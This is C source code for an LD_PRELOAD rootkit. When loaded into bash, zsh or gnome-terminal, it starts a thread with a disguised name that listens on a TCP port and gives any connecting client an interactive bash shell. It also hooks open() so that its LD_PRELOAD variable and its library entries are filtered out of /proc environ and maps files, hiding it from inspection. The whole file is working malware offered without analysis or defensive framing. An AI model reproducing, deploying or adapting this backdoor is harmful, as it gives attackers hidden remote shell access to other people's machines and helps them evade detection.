#define _GNU_SOURCE
#include "config.h"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <dlfcn.h>
#include <errno.h>
#include <stdarg.h>
#include <sys/wait.h>
#include <sys/types.h>

static int ghost_fd = -1;
static int should_run = 1;

typedef int (*open_t)(const char *, int, ...);
typedef ssize_t (*read_t)(int, void *, size_t);
typedef ssize_t (*write_t)(int, const void *, size_t);
typedef int (*close_t)(int);

static open_t real_open = NULL;
static read_t real_read = NULL;
static close_t real_close = NULL;

static write_t real_write = NULL;

static int init_libc_funcs(void) {
    real_open = (open_t)dlsym(RTLD_NEXT, "open");
    real_read = (read_t)dlsym(RTLD_NEXT, "read");
    real_write = (write_t)dlsym(RTLD_NEXT, "write");
    real_close = (close_t)dlsym(RTLD_NEXT, "close");
    return (real_open && real_read && real_write && real_close) ? 0 : -1;
}

static int is_target_process(void) {
    char comm[256] = {0};
    ssize_t len = readlink("/proc/self/exe", comm, sizeof(comm) - 1);
    if (len <= 0) return 0;
    comm[len] = '\0';
    
    return (strstr(comm, "gnome-terminal") != NULL || 
            strstr(comm, "zsh") != NULL ||
            strstr(comm, "bash") != NULL);
}

static int is_ghost_path(const char *path) {
    if (!path) return 0;
    return (strstr(path, "/proc/self/maps") != NULL ||
            strstr(path, "/proc/self/environ") != NULL ||
            strstr(path, "/proc/") != NULL && strstr(path, "/maps") != NULL ||
            strstr(path, "/proc/") != NULL && strstr(path, "/environ") != NULL);
}

static char *filter_environ(const char *path) {
    static char filtered[65536] = {0};
    static int fd = -1;
    static char buffer[4096];
    
    if (!real_open || !real_read || !real_close) {
        if (init_libc_funcs() < 0) return NULL;
    }
    
    fd = real_open(path, O_RDONLY);
    if (fd < 0) return NULL;
    
    ssize_t total = 0;
    ssize_t n;
    while ((n = real_read(fd, buffer, sizeof(buffer) - 1)) > 0 && total < sizeof(filtered) - 1) {
        buffer[n] = '\0';
        
        char *src = buffer;
        char *dst = filtered + total;
        while (*src) {
            if (strncmp(src, "LD_PRELOAD=", 11) == 0) {
                src = strchr(src, '\n');
                if (!src) break;
                src++;
                continue;
            }
            *dst++ = *src++;
        }
        total = dst - filtered;
    }
    real_close(fd);
    
    return filtered;
}

static char *filter_maps(const char *path) {
    static char filtered[131072] = {0};
    static int fd = -1;
    static char buffer[4096];
    
    if (!real_open || !real_read || !real_close) {
        if (init_libc_funcs() < 0) return NULL;
    }
    
    fd = real_open(path, O_RDONLY);
    if (fd < 0) return NULL;
    
    ssize_t total = 0;
    ssize_t n;
    while ((n = real_read(fd, buffer, sizeof(buffer) - 1)) > 0 && total < sizeof(filtered) - 1) {
        buffer[n] = '\0';
        
        char *src = buffer;
        char *dst = filtered + total;
        while (*src) {
            if ((strstr(src, GHOST_SO_NAME) != NULL && 
                 (src == buffer || *(src-1) == '\n')) ||
                strstr(src, "/tmp/") != NULL && strstr(src, ".so") != NULL) {
                src = strchr(src, '\n');
                if (!src) break;
                src++;
                continue;
            }
            *dst++ = *src++;
        }
        total = dst - filtered;
    }
    real_close(fd);
    
    return filtered;
}

int open(const char *path, int flags, ...) {
    if (!real_open) init_libc_funcs();
    
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, int);
        va_end(args);
    }
    
    if (is_ghost_path(path)) {
        if (strstr(path, "environ") != NULL) {
            char *filtered = filter_environ(path);
            if (filtered) {
                int fd = real_open("/dev/null", O_RDONLY);
                if (fd >= 0) {
                    static char stored_path[256];
                    snprintf(stored_path, sizeof(stored_path), "/tmp/.ghost_environ_%d", getpid());
                    int wfd = real_open(stored_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
                    if (wfd >= 0) {
                        real_write(wfd, filtered, strlen(filtered));
                        real_close(wfd);
                        return real_open(stored_path, flags, mode);
                    }
                    real_close(fd);
                }
            }
        }
        else if (strstr(path, "maps") != NULL) {
            char *filtered = filter_maps(path);
            if (filtered) {
                static char stored_path[256];
                snprintf(stored_path, sizeof(stored_path), "/tmp/.ghost_maps_%d", getpid());
                int wfd = real_open(stored_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
                if (wfd >= 0) {
                    real_write(wfd, filtered, strlen(filtered));
                    real_close(wfd);
                    return real_open(stored_path, flags, mode);
                }
            }
        }
    }
    
    return real_open(path, flags, mode);
}

static ssize_t hooked_read(int fd, void *buf, size_t count) {
    if (!real_read) init_libc_funcs();
    
    ssize_t ret = real_read(fd, buf, count);
    if (ret <= 0) return ret;
    
    char path[256];
    char proc_fd[64];
    snprintf(proc_fd, sizeof(proc_fd), "/proc/self/fd/%d", fd);
    
    ssize_t len = readlink(proc_fd, path, sizeof(path) - 1);
    if (len > 0) {
        path[len] = '\0';
        
        if (strstr(path, "maps") != NULL || strstr(path, "environ") != NULL) {
            char *filtered = (strstr(path, "environ")) ? 
                filter_environ(path) : filter_maps(path);
            if (filtered) {
                size_t filter_len = strlen(filtered);
                if (filter_len < count) {
                    memcpy(buf, filtered, filter_len);
                    return filter_len;
                }
            }
        }
    }
    
    return ret;
}

void *ghost_listener(void *arg) {
    int server_fd, client_fd;
    struct sockaddr_in addr;
    int opt = 1;
    socklen_t addrlen = sizeof(addr);
    
    prctl(PR_SET_NAME, FAKE_THREAD_NAME, 0, 0, 0);
    
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) return NULL;
    
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
        close(server_fd);
        return NULL;
    }
    
    int flags = fcntl(server_fd, F_GETFD, 0);
    if (flags >= 0) fcntl(server_fd, F_SETFD, flags | FD_CLOEXEC);
    
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(GHOST_PORT);

    if (bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(server_fd);
        return NULL;
    }
    
    ghost_fd = server_fd;
    
    if (listen(server_fd, 3) < 0) {
        close(server_fd);
        return NULL;
    }

    while (should_run && access(KILL_SWITCH, F_OK) != 0) {
        struct timeval tv = {2, 0}; 
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(server_fd, &fds);
        
        int ret = select(server_fd + 1, &fds, NULL, NULL, &tv);
        if (ret < 0) {
            if (errno == EINTR) continue;
            break;
        }
        if (ret == 0) continue;
        
        client_fd = accept(server_fd, (struct sockaddr *)&addr, &addrlen);
        if (client_fd >= 0) {
            pid_t pid = fork();
            if (pid == 0) {
                close(server_fd);
                dup2(client_fd, 0); dup2(client_fd, 1); dup2(client_fd, 2);
                unsetenv("LD_PRELOAD"); 
                execl("/bin/bash", "bash", "--noprofile", "--norc", "-i", NULL);
                exit(0);
            }
            close(client_fd);
            if (pid > 0) waitpid(pid, NULL, WNOHANG);
        }
    }
    close(server_fd);
    return NULL;
}

__attribute__((constructor))
void init_ghost(void) {
    if (!is_target_process()) return;
    
    if (init_libc_funcs() < 0) return;

    pthread_t tid;
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    pthread_create(&tid, &attr, ghost_listener, NULL);
    pthread_attr_destroy(&attr);
}

__attribute__((destructor))
void cleanup_ghost(void) {
    should_run = 0;
    if (ghost_fd >= 0) {
        close(ghost_fd);
        ghost_fd = -1;
    }
}
